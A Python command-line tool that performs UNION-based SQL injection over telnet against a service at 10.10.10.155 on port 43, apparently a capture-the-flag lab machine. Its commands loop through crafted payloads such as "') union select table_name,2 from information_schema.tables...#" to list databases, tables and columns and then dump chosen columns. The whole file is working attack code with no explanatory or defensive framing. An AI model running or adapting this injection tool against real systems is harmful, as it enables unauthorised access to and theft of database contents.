#coding:utf-8

import requests
import sys
import telnetlib

from cmd import Cmd
from optparse import *

class TM(Cmd):
	'''
		This function will manage the
		sending of the queries to the server __TM__().
	'''
	prompt = "SQL> "

	def __init__(self, address="10.10.10.155", port=43):
		'''
			The authentication phase
			takes place here __init__().
		'''
		super().__init__()
		self.address = address
		self.port    = port
		
		# The SQL queries takes place here, and the methods of sending.
		# best requests here !! __init__().

		self.database_examples  = b"') union select database(),2 limit x,1#\n"
		self.tables_examples    = b"') union select table_name,2 from information_schema.tables where table_schema='x' limit x,1#\n"
		self.columns_examples   = b"') union select column_name,2 from information_schema.columns where table_name='x' limit x,1#\n"
		self.dumps_examples     = b"') union select x,2 from x limit x,1#\n" 

	def do_db(self, args):
		'''
			This part consumes to
			see the databases __do_dbs__().
		'''
		for dbs_id in range(0, 100):
			self.dbs = telnetlib.Telnet(self.address, self.port)
			self.write_db = b"') union select database(),2 limit %d,1#\n" %(dbs_id)

			self.dbs.write(self.write_db)
			self.dbs = self.dbs.read_all().decode('ascii')
			self.dbs = self.dbs.split()[::-1][0]

			# It will test if the database exists in the condition.
			# And to return a value with the condition.

			if(not self.dbs == "object"):
				print("Database : %s" %(self.dbs))

	def do_tables_dbs(self, args):
		'''
			This function is intended to
			capture the tables of the database __do_tables_dbs__().
			Usage: <database_name>		
		'''
		for table_id in range(0, 100):
			self.dbs = telnetlib.Telnet(self.address, self.port)
			self.write_db = b"') union select table_name,2 from information_schema.tables where table_schema='%s' limit %d,1#\n" %(bytes(args, encoding='utf-8'), table_id)

			self.dbs.write(self.write_db)
			self.dbs = self.dbs.read_all().decode('ascii')
			self.dbs = self.dbs.split()[::-1][0]

			if(not self.dbs == "object"):
				print("Table : %s" %(self.dbs))

	def do_column_dbs(self, args):
		'''
			This function is used to read
			the columns of the database __do_column_dbs__().
			Usage: <table_name>
		'''
		for column_id in range(0, 100):
			self.dbs = telnetlib.Telnet(self.address, self.port)
			self.write_db = b"') union select column_name,2 from information_schema.columns where table_name='%s' limit %d,1#\n" %(bytes(args, encoding='utf-8'), column_id)
			
			self.dbs.write(self.write_db)
			self.dbs = self.dbs.read_all().decode('ascii')
			self.dbs = self.dbs.split()[::-1][0]

			if(not self.dbs == "object"):
				print("Column :", self.dbs)

	def do_dumps_dbs(self, args):
		'''
			This function allows to dump
			the information on the columns __do_dumps_dbs__().
			Usage: <column> <table>
		'''
		for dump_id in range(0, 100):
			self.dbs = telnetlib.Telnet(self.address, self.port)
			self.column = args.split(' ')[0]
			self.table  = args.split(' ')[1]
			
			# We cut args because it can only hold a value.
			# And send us the information to the database.

			self.write_db = b"') union select %s,2 from %s limit %d,1#\n" %(bytes(self.column, encoding='utf-8'), bytes(self.table, encoding='utf-8'), dump_id)
			self.dbs.write(self.write_db)
			self.dbs = self.dbs.read_all().decode('ascii')
			del self.dbs.split()[0:19]

			if(not self.dbs.split()[::-1][0] == "object"):
				print(self.dbs)

if __name__ == "__main__":
	TM().cmdloop()
